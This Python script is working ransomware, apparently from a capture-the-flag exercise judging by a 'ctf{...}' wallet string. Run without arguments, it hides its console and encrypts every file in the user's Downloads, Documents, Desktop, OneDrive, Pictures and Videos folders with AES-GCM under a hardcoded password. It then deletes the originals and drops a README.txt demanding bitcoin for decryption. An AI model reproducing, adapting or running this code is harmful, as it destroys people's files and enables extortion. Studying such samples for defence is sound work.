import ctypes
import os
import sys
import subprocess
import argparse
import importlib.util
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed

TARGET_FOLDERS = [
    r"~/Downloads",
    r"~/Documents",
    r"~/Desktop",
    r"~/OneDrive",
    r"~/Pictures",
    r"~/Videos",
]

PASSWORD        = "G24k34932_^&@jd"
DELETE_ORIGINAL = True

WORKERS = None
EXECUTION_MODE = "thread"


CHUNK_SIZE = 32



SALT_SIZE = 16          
NONCE_SIZE = 12         
KEY_SIZE = 32           
KDF_ITERATIONS = 480_000
MAGIC = b"ENCF"         
VERSION = b"\x01"       
ENC_EXT = ".enc"

SCRIPT_DIR = Path(__file__).resolve().parent

REQUIRED_PACKAGES = {
    "cryptography": "cryptography",
}


def _is_installed(module_name: str) -> bool:
    return importlib.util.find_spec(module_name) is not None


def _pip_install(package: str) -> bool:
    print(f"[setup] Installing missing dependency: {package} ...")
    candidates = [
        [sys.executable, "-m", "pip", "install", "--upgrade", package],
        [sys.executable, "-m", "pip", "install", "--upgrade", "--user", package],
        [sys.executable, "-m", "pip", "install", "--upgrade",
         "--break-system-packages", package],
    ]
    for cmd in candidates:
        try:
            result = subprocess.run(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except Exception as exc:
            print(f"[setup] Could not run pip: {exc}")
            continue
        if result.returncode == 0:
            print(f"[setup] Installed {package} successfully.")
            return True
        print(f"[setup] pip attempt failed (rc={result.returncode}). Trying next method...")
    return False


def ensure_dependencies() -> None:
    missing = [pkg for mod, pkg in REQUIRED_PACKAGES.items()
               if not _is_installed(mod)]
    if not missing:
        return
    print(f"[setup] Missing dependencies: {', '.join(missing)}")
    if subprocess.run(
        [sys.executable, "-m", "pip", "--version"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    ).returncode != 0:
        print("[setup] pip is not available; attempting to bootstrap it...")
        try:
            subprocess.run(
                [sys.executable, "-m", "ensurepip", "--upgrade"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except Exception:
            pass
    for pkg in missing:
        if not _pip_install(pkg):
            sys.exit(
                f"ERROR: could not install required package '{pkg}'.\n"
                f"       Please install it manually:  "
                f"{sys.executable} -m pip install {pkg}"
            )
    for mod, pkg in REQUIRED_PACKAGES.items():
        try:
            importlib.import_module(mod)
        except Exception as exc:
            sys.exit(f"ERROR: '{pkg}' is installed but failed to import: {exc}")


def hide_console() -> None:
    if os.name != "nt":
        return
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def _crypto():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    return AESGCM, PBKDF2HMAC, hashes


def derive_key(password: str, salt: bytes) -> bytes:
    _, PBKDF2HMAC, hashes = _crypto()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=KEY_SIZE,
        salt=salt,
        iterations=KDF_ITERATIONS,
    )
    return kdf.derive(password.encode("utf-8"))


def encrypt_file(file_path: Path, password: str, delete_original: bool = False) -> Path:
    """Encrypt a single file. Does NOT print; caller reports results."""
    if file_path.suffix == ENC_EXT:
        return file_path

    AESGCM, _, _ = _crypto()

    salt = os.urandom(SALT_SIZE)
    nonce = os.urandom(NONCE_SIZE)
    key = derive_key(password, salt)
    aesgcm = AESGCM(key)

    plaintext = file_path.read_bytes()
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)

    out_path = file_path.with_suffix(file_path.suffix + ENC_EXT)
    with open(out_path, "wb") as f:
        f.write(MAGIC)
        f.write(VERSION)
        f.write(salt)
        f.write(nonce)
        f.write(ciphertext)

    if delete_original:
        file_path.unlink()

    return out_path


def _encrypt_batch(paths, password: str, delete_original: bool):
    """Encrypt a batch of files. Returns list of
    (path_str, status, detail) with status in {'ok','skip','error'}."""
    results = []
    for p in paths:
        fp = Path(p)
        try:
            if fp.suffix == ENC_EXT:
                results.append((str(fp), "skip", "already encrypted"))
                continue
            out = encrypt_file(fp, password, delete_original=delete_original)
            results.append((str(fp), "ok", str(out)))
        except Exception as exc:
            results.append((str(fp), "error", f"{type(exc).__name__}: {exc}"))
    return results


def _encrypt_batch_worker(paths, password: str, delete_original: bool):
    """ProcessPoolExecutor entry point (must be module-level)."""
    return _encrypt_batch(paths, password, delete_original)


def _resolve_workers(requested) -> int:
    if requested is None or requested <= 0:
        return max(1, os.cpu_count() or 1)
    return requested


def _chunks(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i + n]


def _report(path_str, status, detail, counters):
    if status == "ok":
        counters["ok"] += 1
        print(f"  [enc] {path_str} -> {Path(detail).name}")
    elif status == "skip":
        counters["skip"] += 1
        print(f"  [skip] {path_str}: {detail}")
    else:
        counters["err"] += 1
        print(f"  [error] {path_str}: {detail}")


def encrypt_folder(folder: Path, password: str, delete_originals: bool = False,
                   workers=None, mode: str = None) -> None:
    """Recursively encrypt all files in a folder using a worker pool."""
    if not folder.is_dir():
        raise NotADirectoryError(f"Not a directory: {folder}")

    mode = mode or EXECUTION_MODE
    files = [p for p in folder.rglob("*") if p.is_file() and p.suffix != ENC_EXT]

    if not files:
        print(f"Nothing to encrypt under {folder}")
        return

    n_workers = _resolve_workers(workers)

    if len(files) == 1 or n_workers == 1:
        print(f"Encrypting {len(files)} file(s) under {folder} (single-process) ...")
        counters = {"ok": 0, "skip": 0, "err": 0}
        for f in files:
            _report(*_encrypt_batch([str(f)], password, delete_originals)[0], counters)
        print(f"  Summary: {counters['ok']} encrypted, "
              f"{counters['skip']} skipped, {counters['err']} failed")
        return

    n_workers = min(n_workers, len(files))
    batches = list(_chunks([str(f) for f in files], CHUNK_SIZE))
    backend = "process" if mode == "process" else "thread"

    print(f"Encrypting {len(files)} file(s) under {folder} using "
          f"{n_workers} {backend} worker(s), {len(batches)} batch(es) ...")

    if backend == "process":
        pool = ProcessPoolExecutor(max_workers=n_workers)
        submit = lambda b: pool.submit(_encrypt_batch_worker, b, password, delete_originals)
        use_cancel_futures = True
    else:
        pool = ThreadPoolExecutor(max_workers=n_workers)
        submit = lambda b: pool.submit(_encrypt_batch, b, password, delete_originals)
        use_cancel_futures = True

    counters = {"ok": 0, "skip": 0, "err": 0}
    futures = {}
    try:
        for b in batches:
            futures[submit(b)] = b
        for fut in as_completed(futures):
            for path_str, status, detail in fut.result():
                _report(path_str, status, detail, counters)
    except KeyboardInterrupt:
        print("Interrupted; cancelling pending tasks "
              "(already-running tasks will finish)...")
        for fut in futures:
            fut.cancel()
        try:
            pool.shutdown(wait=False, cancel_futures=True)
        except TypeError:
            pool.shutdown(wait=False)
        raise
    else:
        pool.shutdown(wait=True)

    print(f"  Summary: {counters['ok']} encrypted, "
          f"{counters['skip']} skipped, {counters['err']} failed")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="AES-256-GCM folder encryption tool (encrypt only). "
                    "With no arguments, uses hardcoded settings and hides console."
    )
    parser.add_argument("folder", nargs="?", type=Path,
                        help="Folder to encrypt (default: hardcoded TARGET_FOLDERS)")
    parser.add_argument("password", nargs="?",
                        help="Encryption password (default: hardcoded PASSWORD)")
    parser.add_argument("--delete", action="store_true",
                        help="Delete original files after successful encryption")
    parser.add_argument("--workers", type=int, default=None,
                        help="Number of worker threads/processes (default: auto = CPU count)")
    parser.add_argument("--mode", choices=("thread", "process"), default=None,
                        help="Worker backend: 'thread' (default) or 'process'")
    return parser


def run_hardcoded() -> int:
    hide_console()

    if not PASSWORD:
        print("ERROR: PASSWORD is empty in the script", file=sys.stderr)
        return 1
    if not TARGET_FOLDERS:
        print("ERROR: TARGET_FOLDERS list is empty", file=sys.stderr)
        return 1

    valid_folders = []
    print(f"targets: {len(TARGET_FOLDERS)}")
    for raw in TARGET_FOLDERS:
        folder = Path(raw).expanduser()
        if not folder.exists():
            print(f"  [skip] folder not found: {folder}")
            continue
        if not folder.is_dir():
            print(f"  [skip] not a directory: {folder}")
            continue
        valid_folders.append(folder)
        print(f"  [ok]   {folder}")

    if not valid_folders:
        print("ERROR: no valid target folders found", file=sys.stderr)
        return 1

    exit_code = 0
    try:
        for folder in valid_folders:
            print(f"\n>>> Encrypting {folder}")
            try:
                encrypt_folder(folder, PASSWORD, DELETE_ORIGINAL,
                               workers=WORKERS, mode=EXECUTION_MODE)
                write_message()
                print(f"<<< Done: {folder}")
            except KeyboardInterrupt:
                print("Interrupted.", file=sys.stderr)
                return 130
            except Exception as exc:
                print(f"ERROR on {folder}: {exc}", file=sys.stderr)
                exit_code = 1
        print(f"\n=== Summary: {len(valid_folders)} folder(s) processed ===")
    finally:
        pass
    return exit_code

def write_message(): 
    lines = ["You have been hacked. \n Send me 10 bitcoins to this address : ctf{lazarus_bitcoin_wallet} to get your files decrypted."]

    with open("README.txt", "w") as file:
        file.writelines(lines)


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    ensure_dependencies()

    if args.folder is None or args.password is None:
        sys.exit(run_hardcoded())

    try:
        encrypt_folder(args.folder, args.password, args.delete,
                       workers=args.workers, mode=args.mode)
    except Exception as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        sys.exit(1)

    


if __name__ == "__main__":
    import multiprocessing as mp
    mp.freeze_support()
    main()
    